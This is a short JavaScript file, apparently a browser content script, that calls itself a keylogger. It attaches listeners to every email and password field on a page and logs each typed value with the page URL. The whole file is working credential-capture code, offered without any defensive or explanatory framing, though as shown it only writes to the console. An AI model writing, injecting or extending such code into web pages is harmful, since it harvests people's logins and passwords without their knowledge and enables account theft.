console.log('Keylogger set up')

function debounce (fn, delay) {
  let timeoutId
  return function (...args) {
    if (timeoutId) {
      clearTimeout(timeoutId)
    }
    timeoutId = setTimeout(() => {
      fn.apply(this, args)
    }, delay)
  }
}

function handleEmailInputEvent (event) {
  console.log(`${window.location.href} Email:`, event.target.value)
}

function handlePasswordInputEvent (event) {
  console.log(`${window.location.href} Password:`, event.target.value)
}

function addListenersToEmailAndPasswordInputs () {
  const inputs = document.querySelectorAll('input')
  const debouncedHandleEmailInputEvent = debounce(handleEmailInputEvent, 500)
  const debouncedHandlePasswordInputEvent = debounce(
    handlePasswordInputEvent,
    500
  )

  inputs.forEach(input => {
    if (input.type === 'email') {
      input.addEventListener('input', debouncedHandleEmailInputEvent)
    } else if (input.type === 'password') {
      input.addEventListener('input', debouncedHandlePasswordInputEvent)
    }
  })
}

addListenersToEmailAndPasswordInputs()
